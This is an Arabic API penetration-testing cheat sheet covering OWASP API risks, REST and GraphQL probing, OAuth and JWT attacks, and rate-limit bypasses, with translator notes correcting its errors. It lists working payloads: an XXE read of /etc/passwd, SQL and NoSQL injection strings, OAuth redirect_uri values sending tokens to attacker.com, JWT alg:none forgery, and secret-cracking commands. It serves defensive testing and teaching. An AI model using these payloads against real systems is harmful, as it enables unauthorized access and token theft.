<a id="-api-security-testing-cheatsheet"></a>
# 🔌 مرجع اختبار أمن واجهات API

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
  ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
  ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
  ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
  ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```

<p align="center">
  <img src="https://img.shields.io/badge/API-Security-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testing-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-red?style=for-the-badge" alt="GraphQL">
</p>

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [OWASP API Top 10](#-owasp-api-top-10)
- [اختبار واجهات REST API](#-rest-api-testing)
- [اختبار GraphQL](#-graphql-testing)
- [هجمات المصادقة](#-authentication-attacks)
- [هجمات JWT](#-jwt-attacks)
- [الثغرات الشائعة](#-common-vulnerabilities)

---

<a id="-owasp-api-top-10"></a>
## 🔴 OWASP API Top 10

| # | الثغرة | الوصف |
|---|---------------|-------------|
| 1 | **BOLA** | خلل التحكم في الوصول على مستوى الكائن |
| 2 | **خلل المصادقة** | نقاط ضعف المصادقة |
| 3 | **BOPLA** | خلل التحكم في الوصول على مستوى خصائص الكائن |
| 4 | **استهلاك الموارد دون قيود** | غياب تقييد معدل الطلبات |
| 5 | **BFLA** | خلل التحكم في الوصول على مستوى الوظيفة |
| 6 | **SSRF** | تزوير الطلبات من جهة الخادم |
| 7 | **إعدادات أمنية خاطئة** | إعدادات افتراضية |
| 8 | **غياب الحماية** | مسار الأعمال |
| 9 | **إدارة غير سليمة للأصول** | واجهات API قديمة |
| 10 | **استهلاك غير آمن لواجهات API** | جهة خارجية |

---

<a id="-rest-api-testing"></a>
## 🌐 اختبار واجهات REST API

<a id="discovery--enumeration"></a>
### الاكتشاف والاستطلاع

```bash
# البحث عن نقاط اتصال API
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# استطلاع الإصدارات
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# مسارات شائعة
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

<a id="http-methods-testing"></a>
### اختبار طرق HTTP

```bash
# اختبار جميع الطرق
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# تجاوز الطريقة المعلنة (Method Override)
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

<a id="parameter-manipulation"></a>
### التلاعب بالمعاملات

```bash
# BOLA/IDOR
GET /api/users/1      # المعرّف الخاص بك
GET /api/users/2      # معرّف مستخدم آخر
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# تلويث المعاملات (Parameter Pollution)
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# محاولة التجاوز باستخدام الترميز
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

<a id="content-type-attacks"></a>
### هجمات تغيير Content-Type

```bash
# تغيير Content-Type
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# محاولة XXE عبر Content-Type
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

<a id="mass-assignment"></a>
### الإسناد الجماعي (Mass Assignment)

```bash
# إضافة حقول إضافية
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # جرّب الإضافة
  "isAdmin": true,           # جرّب الإضافة
  "balance": 99999,          # جرّب الإضافة
  "verified": true           # جرّب الإضافة
}

# باستخدام المصفوفات
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

<a id="-graphql-testing"></a>
## 📊 اختبار GraphQL

<a id="introspection"></a>
### استكشاف المخطط (Introspection)

```graphql
# استعلام استكشاف المخطط الكامل وفق الأصل
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# استكشاف بسيط للمخطط
{__schema{types{name,fields{name}}}}

# جلب أسماء جميع الاستعلامات
{__schema{queryType{fields{name,description}}}}

# جلب أسماء جميع عمليات Mutation
{__schema{mutationType{fields{name,description}}}}
```

<a id="common-attacks"></a>
### هجمات شائعة

```graphql
# IDOR
query { user(id: 2) { email, password } }

# هجوم التجميع باستخدام الأسماء البديلة
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# حجب الخدمة باستعلام متداخل
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# اقتراحات الحقول
{ user { a }  # قد يقترح أسماء حقول صالحة
```

<a id="sql-injection-in-graphql"></a>
### حقن SQL داخل GraphQL

```graphql
# حقن SQL في الوسائط
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# حقن NoSQL
query { user(query: "{$gt: ''}") { id } }
```

<a id="bypass-disabled-introspection"></a>
### محاولة تجاوز تعطيل Introspection

```graphql
# استكشاف بديل للمخطط
query { __type(name: "User") { fields { name } } }

# تخمين أسماء الحقول باستخدام ffuf
# استخدام قائمة بأسماء حقول GraphQL الشائعة
```

---

<a id="-authentication-attacks"></a>
## 🔐 هجمات المصادقة

<a id="api-key-testing"></a>
### اختبار مفاتيح API

```bash
# البحث عن مفاتيح API
# فحص ملفات JavaScript وتطبيقات الهاتف وGitHub

# اختبار المفتاح في مواضع مختلفة
curl -H "X-API-Key: KEY" https://api.target.com
curl -H "Authorization: Bearer KEY" https://api.target.com
curl -H "api-key: KEY" https://api.target.com
curl "https://api.target.com?api_key=KEY"
```

<a id="oauthoauth2-attacks"></a>
### هجمات OAuth/OAuth2

```bash
# سرقة الرمز عبر redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# محاولة تجاوز معامل state
# إزالة معامل state
# استخدام قيمة state نفسها لمستخدمين مختلفين

# تسرّب الرمز
# فحص ترويسة Referer بحثًا عن تسرّب الرمز
```

<a id="session-management"></a>
### إدارة الجلسات

```bash
# استطلاع الرموز
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# هل تظل الرموز القديمة صالحة بعد تسجيل الخروج؟
# مشكلات استبدال الرموز
# إعادة استخدام الرمز عبر الجلسات
```

---

<a id="-jwt-attacks"></a>
## 🎫 هجمات JWT

<a id="decode-jwt"></a>
### فك ترميز JWT

```bash
# عبر الإنترنت: jwt.io
# CLI
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

<a id="algorithm-confusion"></a>
### الخلط بين الخوارزميات

```bash
# تغيير alg إلى none
{
  "alg": "none",
  "typ": "JWT"
}
# إزالة التوقيع

# هجوم HS256 → RS256 وفق اتجاه السهم في الأصل
# استخدام المفتاح العام بوصفه سر HMAC
```

<a id="signature-bypass"></a>
### تجاوز التحقق من التوقيع

```bash
# إزالة التوقيع مع الإبقاء على النقاط
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# تخمين سر ضعيف
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# أسرار ضعيفة شائعة
secret
password
123456
your-256-bit-secret
```

<a id="claim-manipulation"></a>
### التلاعب بالمطالبات (Claims)

```javascript
// تغيير مطالبات المستخدم
{
  "sub": "1234567890",
  "name": "admin",        // التغيير إلى admin
  "role": "admin",        // رفع الدور
  "admin": true,          // إضافة علامة admin
  "exp": 9999999999       // تمديد انتهاء الصلاحية
}
```

<a id="jwt-tools"></a>
### أدوات JWT

```bash
# jwt_tool
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T    # تعديل الرمز
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # كسر السر

# jwtcrack
./jwtcrack <JWT>
```

---

<a id="-common-vulnerabilities"></a>
## 🐛 الثغرات الشائعة

<a id="rate-limiting-bypass"></a>
### محاولة تجاوز تقييد المعدل

```bash
# ترويسات للتجربة
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# تغيير حالة الأحرف
X-FORWARDED-FOR: 127.0.0.1

# بايت صفري
X-Forwarded-For: 127.0.0.1%00

# نقاط اتصال مختلفة
/api/login
/API/LOGIN
/api/Login
/api/login/
```

<a id="bola-broken-object-level-authorization"></a>
### BOLA (خلل التحكم في الوصول على مستوى الكائن)

```bash
# اختبار التلاعب بالمعرّف
GET /api/orders/123    # الطلب الخاص بك
GET /api/orders/124    # طلب شخص آخر

# تخمين معرّفات UUID
# البحث عن أنماط قابلة للتنبؤ
# تجربة المعرّفات المتتابعة أوالمعتمدة على الطابع الزمني

# المعرّف بصيغ مختلفة
/api/users/1
/api/users/001
/api/users/user_1
/api/users/0x1
```

<a id="bfla-broken-function-level-authorization"></a>
### BFLA (خلل التحكم في الوصول على مستوى الوظيفة)

```bash
# الوصول إلى نقاط الإدارة كمستخدم عادي
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# اختبار يعتمد على طريقة HTTP
GET /api/users     # مسموح
POST /api/users    # هل يجب قصره على المسؤول؟
DELETE /api/users  # هل يجب قصره على المسؤول؟
```

<a id="improper-assets-management"></a>
### إدارة غير سليمة للأصول

```bash
# إصدارات API قديمة
/api/v1/users    # قد تتضمن ثغرات إضافية
/api/v2/users    # الحالي
/api/v3/users    # تجريبي أوغير منشور

# نقاط اتصال التطوير
/api/debug/
/api/test/
/api/internal/
/api/dev/
```

---

<a id="-tools"></a>
## 🛠️ الأدوات

| الأداة | الغرض |
|------|---------|
| **Burp Suite** | اعتراض API واختباره |
| **Postman** | استكشاف API |
| **Insomnia** | عميل REST/GraphQL |
| **graphql-voyager** | عرض GraphQL بصريًا |
| **jwt_tool** | اختبار JWT |
| **Arjun** | اكتشاف المعاملات |

---

<a id="-resources"></a>
## 📚 الموارد

- [أهم عشرة مخاطر لأمن API من OWASP](https://owasp.org/API-Security/)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [JWT.io](https://jwt.io/)

---

<p align="center">
  <b>🔌 أمّن واجهات API الخاصة بك!</b><br>
  <i>للاختبارات المأذون بها فقط!</i>
</p>

> **مصطلحات:** API واجهة برمجة تطبيقات، وREST أسلوب لتنظيم واجهات الويب، وGraphQL لغة للاستعلام عن البيانات. المصادقة (Authentication) تتحقق من الهوية، بينما التفويض (Authorization) يحدد ما يُسمح لهذه الهوية بفعله. BOLA يتعلق بالكائن نفسه، وBOPLA بخصائصه، وBFLA بالوظيفة. حُفظ الرسم النصي الإنجليزي الذي يعرض اسم مجال أمن API.

> **تصحيح لتصنيف OWASP:** يمزج جدول الأصل تسميات وترتيبًا غير دقيقين. في إصدار 2023، API6 هو Unrestricted Access to Sensitive Business Flows، وAPI7 هو SSRF، وAPI8 هو Security Misconfiguration، وAPI9 هو Improper Inventory Management. واستهلاك الموارد أوسع من مجرد غياب حد لمعدل الطلبات. أُبقي الجدول الأصلي كاملًا مع هذا التصحيح. [قائمة OWASP API Top 10 لعام 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/).

> **تصحيحات JWT:** يتكوّن الرمز من أجزاء base64url تفصلها نقاط، لذا لا يفك الأمر `base64 -d` النص المقتطع المنتهي بـ `...` بوصفه JWT كاملًا، وفك الترميز ليس تحققًا من التوقيع. [RFC 7519](https://www.rfc-editor.org/rfc/rfc7519.html#section-3). وفي خلط المفتاح العام مع HMAC يكون المثال المعتاد التحول من توقع RS256 إلى قبول HS256 بالمفتاح العام بوصفه سرًا؛ سهم HS256 → RS256 في تعليق الأصل معكوس بالنسبة لهذا السيناريو. [شرح PortSwigger](https://portswigger.net/web-security/jwt/algorithm-confusion).

> **توضيح GraphQL والمقتطفات:** `__type` جزء من Introspection نفسه، وليس ضمانًا لتجاوز تعطيل صحيح لهذه الميزة. [مواصفة GraphQL](https://spec.graphql.org/October2021/#sec-Introspection). مثال اقتراح الحقول في الأصل ناقص قوس إغلاق، وطلب curl الخاص بـ XXE لا يحدد URL؛ كما أن JSON الذي يتضمن تعليقات توضيحية ليس JSON صارمًا كما هو. حُفظت هذه المقتطفات حرفيًا للمقارنة. تعديل المطالبات أوالترويسات أوالمعرّفات لا يثبت وجود ثغرة إلا إذا قبل الخادم سلوكًا غير مأذون به.
